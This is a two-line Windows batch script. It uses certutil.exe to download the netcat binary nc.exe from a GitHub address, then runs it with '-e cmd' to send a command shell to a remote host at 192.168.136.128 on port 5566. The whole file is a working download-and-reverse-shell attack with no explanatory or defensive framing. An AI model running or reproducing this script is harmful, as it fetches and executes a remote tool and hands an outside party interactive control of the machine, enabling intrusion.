@echo off
certutil.exe -urlcache -split -f https://github.com/dingpotian/nc.exe-windows/blob/master/nc.exe nc.exe & powershell nc.exe -e cmd 192.168.136.128 5566